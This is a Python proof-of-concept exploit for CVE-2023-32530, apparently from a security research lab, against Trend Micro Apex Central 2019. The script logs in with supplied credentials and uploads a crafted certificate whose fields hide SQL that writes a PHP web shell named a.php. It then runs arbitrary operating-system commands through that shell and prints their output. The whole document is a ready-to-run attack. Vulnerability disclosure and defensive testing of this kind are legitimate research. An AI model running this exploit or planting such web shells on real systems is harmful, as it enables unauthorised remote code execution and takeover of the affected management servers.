# Trend Micro Apex Central 2019 (<= Build 6016) Authenticated RCE (CVE-2023-32530)
# Vector used: AddCert()
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)

#!/usr/bin/env python3
import base64
import hashlib
import hmac
import re
import requests
import sys
import urllib.parse
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
requests.packages.urllib3.disable_warnings()

s = requests.Session()

def check_args():
    global target, username, password, cmd

    print("\n===== Trend Micro Apex Central 2019 (<= Build 6016) Authenticated RCE (CVE-2023-32530) =====\n")

    if len(sys.argv) != 5:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE".format(sys.argv[0]))
        sys.exit(1)

    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = urllib.parse.quote(sys.argv[4])

def authenticate():
    global s

    print("[+] Attempting to authenticate...")

    # MD5 hash the password, store as tempPassword
    temp_password = hashlib.md5(password.encode()).hexdigest().encode()

    # GET the challenge number from GET /webapp/Login.aspx?Query=GetChallengeNumber
    res = s.get("{}/webapp/Login.aspx?Query=GetChallengeNumber".format(target), verify=False)
    chall_num = re.match("ChallengeNumber=(.+)\n", res.text).group(1).strip().encode()

    # HMAC-MD5 the tempPassword using the challenge number as the key, store as the new tempPassword
    temp_password = hmac.new(chall_num, temp_password, hashlib.md5).hexdigest().strip().encode()

    # GET RSA key at /ControlManager/download/SSO_PKI_PublicKey.pem
    res = s.get("{}/ControlManager/download/SSO_PKI_PublicKey.pem".format(target), verify=False)
    rsa_key = res.text.strip().encode()

    # Encrypt the tempPassword with the RSA public key, PKCS1_v1_5 is mandatory and PKCS1_OAEP does not work due to JSEncrypt
    cipher = PKCS1_v1_5.new(RSA.import_key(rsa_key))
    ciphertext = cipher.encrypt(temp_password)
    encrypted_password = base64.b64encode(ciphertext)

    # Login
    data = {
        "Query": "Logon",
        "UserName": username,
        "PassWord": encrypted_password,
        "InstID": "",
        "Format": "",
        "Location": ""
    }
    res = s.post("{}/webapp/Login.aspx".format(target), data=data, verify=False)

    if ".ASPXAUTH" not in res.cookies:
        print("[!] Failed to authenticate. Are the credentials correct?")
        sys.exit(1)

    # Get PHPSESSID Cookie
    s.post("{}/webapp/widget/index.php".format(target), verify=False)
    print("[+] Authenticated successfully!")

def upload_web_shell():
    global s

    print("[+] Attempting to upload web shell...")

    data = {
        "module": "modTMMS",
        "tmms_cmd": "set_certificates_config"
    }

    files = {
        "cert_file_name": """-----BEGIN CERTIFICATE-----
MIIFGjCCAwICFFF8O58DRgJ3YzjGBLSm+3mXyjT5MA0GCSqGSIb3DQEBCwUAMEkx
RzBFBgNVBAMMPiovVEFCTEUgYS5iKGMgdGV4dCk7SU5TRVJUIElOVE8gYS5iIFZB
TFVFUygiPD89YCRfR0VUW2NdYD8+Iik7MB4XDTIyMDYwODA1NDUwMloXDTIzMDYw
ODA1NDUwMlowSjFIMEYGA1UEAww/JywxLDEsMSwxLDEsMSwxLDEpO0FUVEFDSCBE
QVRBQkFTRSdSRVBPU0l+MS9hLnBocCdBUyBhO0NSRUFURS8qMIICIjANBgkqhkiG
9w0BAQEFAAOCAg8AMIICCgKCAgEA/U1FjBQAl02XGISOCFo6GoGQA8JEwCMrDvsC
cwZZ6RMJL3Q81FhxA5XkmjZs8ml76P56oL1Cw7bWge4OapZ1L+bj89iG9cE3EMYR
PoDzjvqpRdNKAU5NRrHXLbzzE1FXek3FxGsEja+EN9OmXNMNCglx66FV2SMqvt/z
jpB2ijz/fO8JZAdKt3eIgtEpyX9l0XM2CiDpUsu1Tij47bp29sWYlqMwFaQ7laA+
MPrIOK7wyenmoyWGVYRAgDRFbfQc5lZ5OHDLMeJCVVaON1YCePpOzOidE7EckFrG
MSF3XkATEX3pPufQr84E+Lwn/HZD4+/MFhZgkZof6BTCLGfiucnpd6vcp+Uf/Jv+
YATpe+mpfhsOvYAyVO0l/20oLXagtTiidHC1jrBxOqagXnuikawc03/euJrRl/xI
6F7dy0np6r1l3oo/mC66buAUygT7TOBkT+RMaEVGMOwYIIh/uiWS6u10jU+WjRok
PVfcV3Yt/50KCqRVTsz4pZxZ0XKWoXUnxocBa70YgcP9JLeLiaLLE5oFb9aQmmfn
w44LXuvb5NeoOIy6RJlX7M1L7lG3+u4VfWu1jc1vFSktdmmpY0LuKYpcmN9jLrLl
IFbRBYKPD71gxwnuXIGblOyQS9Fiz3W8sJMkeoWg6tHrJ2mGqHEtxmhmYo9mKy2O
Ueg+PccCAwEAATANBgkqhkiG9w0BAQsFAAOCAgEACQvQiJThQzCAOfhJQLa5jcSt
gz3YwyyuAZvuaqPa7tNFmh4PQYh0M+xcv953yKkVsAtqa9kp4vpEedvUkrmHXGuw
izj+5BmGfuZ+tKp5WncGqaHicyow32ZIuuc3Tysq8Bhk8BQXzRN2AZl3PIdpjs/K
IcVCIbIkLiTUQ6UnPAKVZ7VLSi8RezAHd/W8FzauL4WzvYbzg5QXMSX8fRbGLpaZ
g9FHglFfgrjW4bRljlnlX0li1J8owRaKAltyYX/8t0rgY8dnwdBuJaUx7ucm2mWn
AxnREnNFl8uFBOGFjhNd+JMNJpxarCE0fKMWMiN1AUDNECG+0I1GJKy7zVmScGVr
nkt6WNvEVrOreg0zXvLOgq6s0aUinZWV82KQ9PFjDxKsQOtq56r1Bcxa9mFmhXmB
hn9etSW2fkCa8Egpf1g5nCjk8F2UIonBJ47RESAlasBFxoEXgSkbEiIUdabOmyak
+O8hEdWEjF4sa4WA36iMXZRshKkAc7d41HhdCZf1vtdAvdMSbzCTwhcSCb3YD5kF
C2Xig4atRc6+gnbMuFnZfGyvWcKSxP0cIdRjFXvAAeyxWHKR+/XCDA40xju6kFVz
FBq7yzgETiuGOItSVtPzTw/C/4iGQjLvBBZi+D+Zi+Lx2DJCQ8vFwvb86oqsxo3R
ewo6zV74qcWDJ2rT63o=
-----END CERTIFICATE-----"""
    }

    s.post("{}/webapp/widget/proxy_controller.php".format(target), data=data, files=files, verify=False)

def check_shell_and_rce():
    print("[+] Attempting to interact with web shell...")
    res = s.get("{}/webapp/widget/repository/a.php?c={}".format(target, cmd))

    if res.status_code != 200:
        print("[!] Failed to find the web shell! Is the system patched?")
        sys.exit(1)

    output = res.text.encode().split(b"\x11\x01\x02+")[1].decode()
    print("[+] Web shell is successfully uploaded at: {}/web/widget/repository/a.php?c={}".format(target, cmd))
    print("[+] Output of command:\n\n{}".format(output))

def main():
    check_args()
    authenticate()
    upload_web_shell()
    check_shell_and_rce()

if __name__ == "__main__":
    main()
